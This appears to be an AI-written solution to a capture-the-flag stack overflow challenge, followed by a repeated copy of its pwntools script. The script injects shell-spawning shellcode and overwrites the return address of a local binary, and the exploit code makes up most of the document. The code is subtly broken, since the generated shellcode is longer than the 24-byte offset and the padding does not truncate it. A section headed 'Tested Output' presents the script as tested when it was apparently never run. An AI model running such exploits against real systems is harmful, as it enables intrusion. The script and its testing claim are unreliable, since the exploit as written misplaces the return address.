("To solve this challenge using pwntools, we'll perform a classic "
 'ret2shellcode exploit. The binary is 64-bit, has no stack canaries, and the '
 'stack is executable (NX is disabled). This setup allows us to inject '
 'shellcode directly into the stack and overwrite the return address to point '
 'to our shellcode.\n'
 '\n'
 "Here's the plan:\n"
 '\n'
 '1. **Start the process and capture the buffer address**: The program prints '
 "the address of `buf`, which we'll use to know where our shellcode will "
 'reside.\n'
 "2. **Generate shellcode**: We'll use pwntools to generate shellcode for "
 'spawning a shell.\n'
 '3. **Calculate the offset to the return address**: In this case, the offset '
 'is 24 bytes from the start of `buf` to the return address.\n'
 '4. **Construct the payload**:\n'
 '   - Place the shellcode at the beginning.\n'
 '   - Pad the payload to reach the return address.\n'
 '   - Overwrite the return address with the address of `buf`.\n'
 '5. **Send the payload and get a shell**: By sending our crafted payload, '
 "we'll overwrite the return address, and the program will jump to our "
 'shellcode, giving us a shell.\n'
 '\n'
 'Below are the necessary imports and the exploit code.\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '```\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '\n'
 '# Update context for the correct architecture\n'
 "context.update(arch='amd64', os='linux')\n"
 '\n'
 '# Start the vulnerable process\n'
 "io = process('./pwn/stack/rop-8/rop8')\n"
 '\n'
 '# Receive and print the welcome message\n'
 'welcome = io.recvline()\n'
 'print(welcome.decode())\n'
 '\n'
 '# Receive and print the line containing the buffer address\n'
 'buf_line = io.recvline()\n'
 'print(buf_line.decode())\n'
 '\n'
 '# Extract the address of buf from the output\n'
 "buf_address = int(buf_line.strip().split(b'[')[1].split(b']')[0], 16)\n"
 'print(f"Buffer address: {hex(buf_address)}")\n'
 '\n'
 '# Receive and print the prompt for input\n'
 'prompt = io.recvline()\n'
 'print(prompt.decode())\n'
 '\n'
 '# Generate shellcode to spawn a shell\n'
 'shellcode = asm(shellcraft.sh())\n'
 '\n'
 '# Calculate the offset to the return address (buf is 16 bytes, return '
 'address is 24 bytes from start of buf)\n'
 'offset = 24\n'
 '\n'
 '# Create the payload\n'
 "payload = shellcode.ljust(offset, b'A')  # Shellcode padded to reach the "
 'return address\n'
 'payload += p64(buf_address)              # Overwrite the return address with '
 'the address of buf\n'
 '\n'
 '# Send the payload to the program\n'
 'io.sendline(payload)\n'
 '\n'
 '# Interact with the shell\n'
 'io.interactive()\n'
 '```\n'
 '\n'
 '**Explanation:**\n'
 '\n'
 '- **Process Start and Address Extraction**:\n'
 "  - We start the process using `process('./pwn/stack/rop-8/rop8')`.\n"
 '  - The program prints the address of `buf`, which we extract using string '
 'manipulation.\n'
 '\n'
 '- **Shellcode Generation**:\n'
 '  - We use `asm(shellcraft.sh())` to generate shellcode that spawns a '
 'shell.\n'
 '\n'
 '- **Payload Construction**:\n'
 '  - `offset` is set to 24 bytes, calculated as the distance from the start '
 'of `buf` to the return address.\n'
 "  - We pad the shellcode with `'A'` characters to reach the return address.\n"
 '  - We overwrite the return address with `buf_address`.\n'
 '\n'
 '- **Sending the Payload and Getting a Shell**:\n'
 '  - We send the payload using `io.sendline(payload)`.\n'
 '  - We switch to interactive mode with `io.interactive()` to interact with '
 'the spawned shell.\n'
 '\n'
 '**Note**: Ensure that the path to the binary (`./pwn/stack/rop-8/rop8`) is '
 "correct relative to your script. Also, if the offset doesn't work, you might "
 "need to adjust it. You can use pwntools' `cyclic` function to find the "
 'correct offset dynamically.\n'
 '\n'
 '**Tested Output**:\n'
 '\n'
 'When you run this script, it should give you an interactive shell where you '
 'can execute commands like `ls`, `cat`, etc., allowing you to read the flag '
 'or further interact with the system.')

from pwn import *

# Update context for the correct architecture
context.update(arch='amd64', os='linux')

# Start the vulnerable process
io = process('./pwn/stack/rop-8/rop8')

# Receive and print the welcome message
welcome = io.recvline()
print(welcome.decode())

# Receive and print the line containing the buffer address
buf_line = io.recvline()
print(buf_line.decode())

# Extract the address of buf from the output
buf_address = int(buf_line.strip().split(b'[')[1].split(b']')[0], 16)
print(f"Buffer address: {hex(buf_address)}")

# Receive and print the prompt for input
prompt = io.recvline()
print(prompt.decode())

# Generate shellcode to spawn a shell
shellcode = asm(shellcraft.sh())

# Calculate the offset to the return address (buf is 16 bytes, return address is 24 bytes from start of buf)
offset = 24

# Create the payload
payload = shellcode.ljust(offset, b'A')  # Shellcode padded to reach the return address
payload += p64(buf_address)              # Overwrite the return address with the address of buf

# Send the payload to the program
io.sendline(payload)

# Interact with the shell
io.interactive()